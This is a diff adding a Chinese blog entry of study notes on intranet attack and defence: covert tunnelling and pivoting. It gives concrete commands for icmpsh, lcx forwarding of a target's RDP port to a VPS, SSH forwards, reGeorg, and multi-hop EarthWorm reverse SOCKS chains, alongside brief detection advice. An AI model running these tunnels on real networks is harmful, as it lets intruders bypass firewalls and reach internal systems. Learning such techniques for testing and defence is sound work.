@@ -2740,4 +2740,227 @@ echo 123;
         <tag>笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>内网安全攻防笔记3</title>
+    <url>/2022/04/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B03/</url>
+    <content><![CDATA[<h1 id="隐藏隧道技术"><a href="#隐藏隧道技术" class="headerlink" title="隐藏隧道技术"></a>隐藏隧道技术</h1><h2 id="隐藏隧道概述"><a href="#隐藏隧道概述" class="headerlink" title="隐藏隧道概述"></a>隐藏隧道概述</h2><p>隧道是指绕过端口屏蔽的方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行通信。<br>常用的隧道:</p>
+<ul>
+<li>网络层: IPV6隧道， ICMP隧道, GRE隧道</li>
+<li>传输层: TCP隧道 ， UDP隧道, 常规端口转发</li>
+<li>应用层: SSH隧道 ， HTTP隧道 ， HTTPS隧道， DNS隧道</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="判断内网联通性"><a href="#判断内网联通性" class="headerlink" title="判断内网联通性"></a>判断内网联通性</h2><p>判断各种协议(TCP, HTTP, DNS, ICMP等)以及端口的情况。常见端口有80,8080,443,53,110,123等。判断联通性方法</p>
+<ol>
+<li>ICMP协议</li>
+</ol>
+<p>通过ping命令判断，使用ICMP协议<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429161739.png"></p>
+<ol start="2">
+<li>TCP协议</li>
+</ol>
+<p>使用nc。通过TCP协议判断端口以及主机的联通性。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429162658.png"></p>
+<p>3.HTTP 协议</p>
+<p>通过CURL判断对应端口是否开启。如果端口开启会发送对应的端口信息。</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429162925.png"></p>
+<ol start="4">
+<li>DNS协议</li>
+</ol>
+<p>Winodws使用 nslookup，Linux使用 dig命令。</p>
+<p>还有一种情况,流量不能直接流出，需要经过企业的代理服务器。判断方法</p>
+<ul>
+<li>查看内网是否有名称为Proxy的机器</li>
+<li>查看IE的直接代理</li>
+<li>下载PAC文件路径</li>
+<li>根据 CURL命令查看<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CURL www.baidu.com //不通</span><br><span class="line">CURL -x proxy-ip:port www.baidu.com //通</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h2><p>网络层中常用的两个隧道协议是IPv6和ICMP。</p>
+<h3 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h3><p>使用IPv6隧道时。将IPv6的报文封装在IPv4报文中，通过IPv4的方法到达目的地。在到达目的地后目标解除IPv4封装，取出IPv6报文。因为现在的安全设备无法检测IPv6通信数据，可以避开安全设置的检测。</p>
+<p>支持IPv6隧道的工具有 socat, 6tunnel, nt6tunnel等</p>
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>在网络环境中如果各类上层协议隧道(HTTP隧道， DNS隧道， 常规的正反向端口转发)都失败了。可以尝试建立ICMP隧道。常用的ICMP隧道工具有 icmpsh, PingTunnel, icmptunnel, powershell icmp等</p>
+<ol>
+<li>icmpsh</li>
+</ol>
+<p>icmpsh可以跨平台使用，而且使用时不需要管理员权限。</p>
+<p>需要安装python 的 impacket库，用于方便对于TCP,UDP,ICMP,IGMP,ARP,IPv4, IPv6, SMB, MSRPC, NTLM, Kerberos, WMI, LDAP等协议的访问。</p>
+<p><code>apt-get install python-impacket</code><br>这里需要使用pip python2版本使用如下命令<br><code>pip2 install impacket</code></p>
+<p>因为icmpsh工具要替代系统本身的ping命令应答程序，需要关闭系统本身的ICMP应答。(恢复系统应答，应该设置为0)，否则Shell无法进行交互。</p>
+<p><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p>
+<p>需要修改run.sh中IP为机器本身IP<br>使用<code>./run.sh</code>运行。</p>
+<p>提示我们输入目标公网ip地址和目标机器使用命令</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429173853.png"></p>
+<p>在目标机器使用命令后建立icmp隧道，使用ipconfig查看目标ip</p>
+<h3 id="防御ICMP隧道方法"><a href="#防御ICMP隧道方法" class="headerlink" title="防御ICMP隧道方法"></a>防御ICMP隧道方法</h3><p>一般防火墙会运行ICMP流量通过，但是使用ICMP隧道会产生大量ICMP流量。我们可以使用Whireshark进行ICMP流量分析，以检测ICMP流量。</p>
+<ul>
+<li>检测同一来源的ICMP数据包流量。一个ping命令正常每秒产生两个数据包，但是使用ICMP隧道在很短的时间内产生大量流量包。</li>
+<li>注意那些Payload大于64bit的ICMP流量包</li>
+<li>寻找响应数据包中Payload和请求数据包中Payload不一致的ICPM数据包</li>
+<li>检查ICMP数据包标签。比如icmptunnel会在所有的ICMP Payload前添加”TUNL”标记来标识隧道。</li>
+</ul>
+<h2 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h2><h3 id="Lcx端口转发"><a href="#Lcx端口转发" class="headerlink" title="Lcx端口转发"></a>Lcx端口转发</h3><p>Lcx是一个基于Socket套接字的端口转发工具有Windows和Linux两个版本。Windows版本为lcx.exe.Linux版为portmap.一个Socket隧道需要具备两端:一端为服务端，监听一个端口等待客户端连接。一端为客户端需要输入服务端的IP地址和端口，主动与服务端连接。</p>
+<ol>
+<li>内网端口转发</li>
+</ol>
+<p>在公网vps上监听4444端口，并将流量转发到5555端口。<br><code>lcx.exe -listen 4444 5555</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220430142810.png"></p>
+<p>在目标机器上执行命令，将3389端口的所有流量转发到公网vps上的4444端口<br><code>lcx.exe -slave 192.168.1.5 4444 127.0.0.1 3389</code></p>
+<p>这时在vps上会显示有机器已连接4444端口.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220430142948.png"></p>
+<p>此时使用mstsc登录<code>&lt;公网ip:端口&gt;</code>或者直接在vps上使用mstsc登录127.0.0.1的5555端口，即可访问目标服务器的3389.</p>
+<ol start="2">
+<li>本地端口映射</li>
+</ol>
+<p>如果目标服务器防火墙不允许特定端口的数据经过防火墙(如3389)，可以将对应端口的流量转发的防火墙可以通过的端口如53.此时可以直接连接目标机器的53端口。</p>
+<p><code>lcx -tran 53 127.0.0.1 3389</code></p>
+<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><p>应用层隧道主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH, HTTP/HTTPS, DNS</p>
+<p>.</p>
+<h3 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h3><p>在日常中几乎所有的Linu\Unix和网络设备都支持SSH协议。防火墙一般也不会拦截SSH协议。同时SSH协议使用时是加密的，所以很难识别SSH是合法的还是恶意的。</p>
+<p>SSH常用参数</p>
+<ul>
+<li>-C: 压缩传输，提高传输速度</li>
+<li>-f: 将SSH传输转入后台，不占用当前Shell</li>
+<li>-N: 建立静默连接(建立了连接，但是看不到具体会话)</li>
+<li>-g: 允许远程主机连接本地用于转发的端口</li>
+<li>-L: 本地端口转发</li>
+<li>-R:远程端口转发</li>
+<li>-D:动态转发(SOCKS代理)</li>
+<li>-P:指定SSH端口</li>
+</ul>
+<ol>
+<li>本地端口转发</li>
+</ol>
+<p>将本地的端口流量，通过控制主机转发到目标主机指定端口上。在本地主机无法访问目标主机，但是控制主机可以访问目标主机时使用。</p>
+<p>在VPS使用如下命令<br><code>ssh -CfNg -L 1153(VPS本地端口):1.1.1.10(目标主机):3389(目标端口) root@192.168.1.1(控制主机)</code></p>
+<p>在VPS访问1153端口即可与1.1.1.10建立连接<br><code>rdesktop 127.0.0.1:1153</code></p>
+<ol start="2">
+<li>远程端口转发</li>
+</ol>
+<p>将远程端口的流量通过自己转发到目标主机的指定端口。<br>在内网中被控主机使用命令<br><code>ssh -CfNg -R 3307(VPS端口):1.1.1.10(目标主机):3389(目标端口) root@192.168.1.4(远程VPS主机)</code></p>
+<p>在VPS访问3307端口，与1.1.1.10建立连接<br><code>rdesktop 127.0.0.1:3307</code></p>
+<p>本地转发是将本地端口流量通过远程主机转发到指定主机和端口<br>远程转发是将远程端口流量通过自己转发到对应主机端口</p>
+<ol start="3">
+<li>动态转发</li>
+</ol>
+<p>在VPS上使用命令，建立动态SOCK5代理通道，需要目标主机密码。<br><code>ssh -CfNg -D 70000 root@192.168.1.1</code></p>
+<p>支持Sock4/5的程序设置代理后都可以使用加密通道进行流量访问</p>
+<ol start="4">
+<li>防御SSH隧道思路</li>
+</ol>
+<p>在系统中设置SSH远程管理白名单,在ACL中设置特定的IP连接SSH。</p>
+<h3 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a>HTTP/HTTPS协议</h3><p>HTTPService代理用于将所有的流量转发到内网。常见的代理工具有 reGeorg ,  meterpreter , tunna等。</p>
+<p>reGeorg支持ASPX , PHP , JSP 等Web脚本，并特别提供了一个Tomcat5版本。</p>
+<p>将脚本上传的目标服务器上，访问目标服务器的tunnel.jsp文件。返回后使用reGeoegSocksProxy.py脚本将监听本地9999端口，既可以建立一个通信链路.</p>
+<p>使用如下命令<br><code>python reGeorgSocksProxy.py -u http://192.168.184.149:8080/tunnel.jsp -p 9999</code></p>
+<p>建立隧道后可以使用ProxyChains类似的工具访问目标内网中的资源。比如暴力破解3389端口。</p>
+<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>DNS隧道的工作原理为:在进行DNS查询的时，如果目标域名不在本地的DNS服务器中时。DNS服务器会再次询问外网的DNS服务器，然后返回结果。如果在互联网网有一台DNS服务器，通过DNS解析协议即可进行数据包交换。DNS协议本来返回的结果为IP地址，但是返回的可以是任意的字符串和加密的指令。</p>
+<p>在使用DNS隧道时在表面上没有连接外网(内网的网关没有转发IP数据包)，但实际上DNS服务器完成了数据包的转发,将其他协议封装在DNS协议内进行传输。</p>
+<p>实验需要域名，以后再说。</p>
+<p>4.防御DNS隧道攻击的方法</p>
+<ul>
+<li>禁止网络中的任何人想外网发送DNS请求，只允许与信任的DNS服务器发送请求</li>
+<li>除了邮件服务器和网关没有人会将TXT请求发送给DNS服务器。因此可以将邮件服务器和网关列入白名单，然后阻止传入流量和传出流量中的TXT请求。</li>
+<li>设置用户的DNS查询次数。如果超过标准，生成对应的报告提醒。</li>
+<li>阻止ICMP</li>
+</ul>
+<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>常用的内网场景</p>
+<ul>
+<li>服务器在内网中，可以访问任意外部网络</li>
+<li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙拒绝敏感端口连接</li>
+<li>服务器在内网中，不可以访问外部网络，对外只开放了部分端口(如80端口)</li>
+</ul>
+<h3 id="常用SOCKS工具"><a href="#常用SOCKS工具" class="headerlink" title="常用SOCKS工具"></a>常用SOCKS工具</h3><p>SOCKS分为SOCKS4和SOCK5两种。SOCKS4只支持TCP协议。SOCKS5支持TCP/UDP协议，还支持各种身份验证机制，标准端口为1080.</p>
+<p>SOCKS代理相当于加强版的lcx。它在服务端监听一个端口，如果有新的连接出现。会从SOCKS协议中解析出目标URL，再执行lcx具体的功能。</p>
+<p>SOCKS代理最好使用命令行工具，并且最好选择不需要依赖的SOCKS代理。</p>
+<ol>
+<li>EarthWorm</li>
+</ol>
+<p>EW可以执行SOCKS 5服务和端口转发。可以以正向反向，多级级联的方式建立SOCKS隧道。EW工具包也提供的多个可执行文件适用于不同的操作系统(Linux ,Windows , Mac, ARM-Linux )</p>
+<ol start="2">
+<li><p>reGeorg</p>
+</li>
+<li><p>sSocks</p>
+</li>
+<li><p>SocksCap64</p>
+</li>
+</ol>
+<p>SocksCap6是一个在Win环境中适合的全局代理工具。</p>
+<p>SocksCap64可以使Windows程序通过SOCKS 代理服务访问网络，而不需要对程序进行修改。即使是那些本身也不支持SOCKS的程序，也可以通过SocksCap64实现代理访问。</p>
+<ol start="5">
+<li><p>Proxifier</p>
+</li>
+<li><p>ProxyChains</p>
+</li>
+</ol>
+<h3 id="SOCKS代理技术在网络环境中的运用"><a href="#SOCKS代理技术在网络环境中的运用" class="headerlink" title="SOCKS代理技术在网络环境中的运用"></a>SOCKS代理技术在网络环境中的运用</h3><h4 id="EW的使用"><a href="#EW的使用" class="headerlink" title="EW的使用"></a>EW的使用</h4><p>EW的使用也非常简单，有六种命令格式分别是 ssocksd , rcsocks , rssocks , lcx_slave, lcx_listen, lcx_tran.其中用于普通网络环境的正向连接命令是 ssocksd, 用于反弹连接的命令是rcsocks, rssocks.</p>
+<ol>
+<li>正向连接SOCKS 5 服务器</li>
+</ol>
+<p>适用与目标服务器拥有一个外网IP地址。</p>
+<p><code>ew -s ssocksd -l 888</code></p>
+<p>在服务器上建立一个端口为888的SOCKS代理。</p>
+<ol start="2">
+<li>反弹SOCKS 5 服务器</li>
+</ol>
+<p>在目标服务器没有公网IP的情况下使用</p>
+<p>首先在VPS上使用如下命令<br><code>ew -s rcsocks -l 1008 -e 888</code></p>
+<p>在VPS上将1008端口收到的流量转发的888端口</p>
+<p>然后在内网服务器上运行如下命令</p>
+<p><code>ew -s rssocks -d 192.168.1.5 -e 888 </code></p>
+<p>表示在内网服务器上启动SOCKS5 服务，反弹到VPS的888端口</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504152119.png"></p>
+<p>这个时候访问VPS的1008端口，就可以使用内网中的SOCKS 5代理服务。</p>
+<ol start="3">
+<li>二级网络环境A</li>
+</ol>
+<p>假设在内网中有控制两个主机A和B.<br>A有公网IP只能访问内网主机B。<br>主机B无法访问外网，但是可以访问内网资源。</p>
+<p>首先在B主机上使用ssocksd方法启动 888端口的SOCKS代理</p>
+<p><code>ew -s ssocksd -l 888</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154037.png"></p>
+<p>然后在A主机使用命令</p>
+<p><code>ew -s lcx_tran -l 1080 -f 192.168.1.1 -g 888</code></p>
+<p>将1080端口收到的 代理转发请求给B主机的10.48.128.49 的 888 端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154210.png"></p>
+<p>现在可以访问A主机的1080端口使用在B主机上的SOCKS5代理</p>
+<ol start="4">
+<li>二级网络B</li>
+</ol>
+<p>与二级网络A相似但是。A主机没有公网IP</p>
+<p>首先在VPS上使用一下命令<br><code>ew -s lcs_listen -l 10800 -e 888</code></p>
+<p>将10800收到的代理请求转发到888端口</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154759.png"></p>
+<p>在B主机使用一下命令</p>
+<p><code>ew -s ssocksd -l 999</code></p>
+<p>在999端口启动SOCKS5服务<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154918.png"></p>
+<p>然后在跳板机A使用命令</p>
+<p><code>ew -s lcx_slave -d 192.168.1.5 -e 888 -f 192.168.1.1 -g 999</code></p>
+<p>在 A主机上使用lcx_slave方式，将VPS的888端口和B主机的999端口连接起来</p>
+<p>返回VPS页面可以发现成功连接<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504155152.png"></p>
+<ol start="5">
+<li>三级网络环境</li>
+</ol>
+<ul>
+<li>A主机没有公网IP,可以访问B主机</li>
+<li>B主机可以访问C主机</li>
+<li>C主机可以访问核心区域</li>
+</ul>
+<p>在VPS执行如下命令，将1080端口请求转发到888端口</p>
+<p><code>ew -s rcsocks -l 1080 -e 888</code></p>
+<p>在A主机执行如下命令，将VPS的888端口和B主机的999端口连接</p>
+<p><code>ew -s lcx_slave -d 192.168.1.5 -e 888 -f 192.168.1.2 -g 999</code></p>
+<p>在B主机执行命令,将999端口收到请求转发给777端口</p>
+<p><code>ew -s lcx_listen -l 999 -e 777 </code></p>
+<p>在C主机上启动SOCKS 5服务，并反弹到B主机的777端口上<br><code>ew -s rssocks -d 192.168.1.2 -e 777 </code></p>
+<p>接着可以访问VPS(192.168.1.5)的 1080端口 访问C主机的SOCKS 5代理服务</p>
+<h4 id="Win中使用SocksCap64实现内网漫游"><a href="#Win中使用SocksCap64实现内网漫游" class="headerlink" title="Win中使用SocksCap64实现内网漫游"></a>Win中使用SocksCap64实现内网漫游</h4><p>在SocksCap中添加代理。测试可以正常运行后即可使用</p>
+<h4 id="在Linux下使用-ProxyChains-实现内网漫游"><a href="#在Linux下使用-ProxyChains-实现内网漫游" class="headerlink" title="在Linux下使用 ProxyChains 实现内网漫游"></a>在Linux下使用 ProxyChains 实现内网漫游</h4><p>在conf文件中删除 “Dynamic_chain”前的”#””。在来到窗口底部将”127.0.0.1 9050”修改为想要访问的端口信息</p>
+<p>可以在使用 /usr/lib/proxychains3/proxyersolv  检查代理是否成功运行</p>
+<p><code>proxyresolv www.baidu.com</code></p>
+<p>使用<br><code>proxychains firefox</code></p>
+<h2 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h2>]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
 </search>
